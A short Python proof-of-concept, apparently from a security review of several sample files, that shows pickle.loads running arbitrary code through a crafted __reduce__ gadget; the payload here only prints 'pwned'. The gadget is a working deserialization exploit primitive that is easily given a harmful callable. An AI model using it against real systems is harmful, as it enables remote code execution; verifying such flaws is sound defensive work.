# PoC for sample-0732.py (representative of 0732/0734/0736/0738/0740.py):
# pickle.loads(base64.b64decode(...)) on untrusted bytes.
# No extra deps.
# Rather than depend on that specific base64 blob decoding to a working
# gadget on this machine, this crafts a fresh pickle with the same
# primitive and calls the exact same pickle.loads().

import pickle

class Gadget:
    def __reduce__(self):
        return (print, ("pwned via pickle.loads()",))

pickle.loads(pickle.dumps(Gadget()))  # <- same call sample-0732.py makes
